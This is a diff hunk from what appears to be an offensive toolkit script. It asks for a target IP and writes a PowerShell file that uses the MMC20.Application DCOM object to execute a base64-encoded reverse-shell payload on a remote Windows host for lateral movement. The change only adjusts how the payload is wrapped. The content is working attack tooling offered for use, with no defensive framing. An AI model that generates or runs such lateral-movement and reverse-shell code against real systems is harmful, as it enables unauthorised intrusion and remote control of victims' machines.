@@ -2,7 +2,7 @@ echo "Answer the following with  a target ip. A powershell script will be genera
 read --prompt-str "Target IP:" target; \
 
 echo "\$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','$target'));" > lateral-movement-dcom.ps1; \
-echo "\$dcom.Document.ActiveView.ExecuteShellCommand('powershell',\$null,'powershell -nop -w hidden -e <% echo $(esh payloads/revshell-windows-powershell-oneliner-base64encoded) %>','7');" >> lateral-movement-dcom.ps1; \
+echo "\$dcom.Document.ActiveView.ExecuteShellCommand('powershell',\$null,'<% echo $(esh payloads/revshell-windows-powershell-oneliner-base64encoded) %>','7');" >> lateral-movement-dcom.ps1; \
 
 mkdir -p packstation/outbound; mv lateral-movement-dcom.ps1 packstation/outbound/; \
 echo '================================================================'; \
